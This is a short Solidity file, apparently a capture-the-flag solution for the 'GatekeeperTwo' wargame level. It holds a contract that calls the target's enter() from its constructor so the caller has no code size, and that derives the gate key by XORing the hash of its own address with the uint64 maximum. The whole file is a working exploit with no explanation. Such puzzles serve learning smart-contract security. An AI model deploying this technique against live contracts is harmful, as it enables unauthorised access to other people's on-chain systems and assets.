// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";
// import 'hardhat/console.sol';

contract GatekeeperTwoHack {

	constructor(address target_address) {
		hack(target_address);
	}

	function hack(address target_address) public {
		GatekeeperTwo gateKeeperTwo = GatekeeperTwo(target_address);
		bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
		gateKeeperTwo.enter(gateKey);
	}

}
